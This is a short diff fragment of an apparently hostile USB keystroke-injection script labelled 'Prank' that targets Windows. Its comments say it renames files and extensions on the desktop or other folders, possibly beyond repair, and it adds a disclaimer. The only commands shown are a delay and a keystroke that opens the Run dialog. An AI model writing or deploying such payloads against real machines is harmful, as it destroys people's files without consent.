@@ -5,8 +5,9 @@ REM Target: Windows / Powershell
 REM Version: 1.0
 REM Category: Prank
 
-REM ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 22 to 27, and paste in the space provided, changing the target directory name.
+REM ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 24 to 29, and paste in the space provided, changing the target directory name.
 REM ~~~~~ CAN RUN SCRIPT 'AS IS' (WITHOUT CHANGES) - Will just attack files on the desktop
+REM ~~~~~ THIS SCRIPT RENAMES FILES AND EXTENSIONS - IT MAY BE IMPOSSIBLE TO REPAIR THIS IS YOU DON'T KNOW EXACTLY WHICH ONE WAS WHICH - I ACCEPT NO RESPONSIBILITY FOR FILE LOSS OR ANY OTHER DAMAGE OR ACTIONS - USE RESPONSIBLY AND WITHIN THE CONFINES OF THE LAW
 
 DELAY 1000
 GUI r
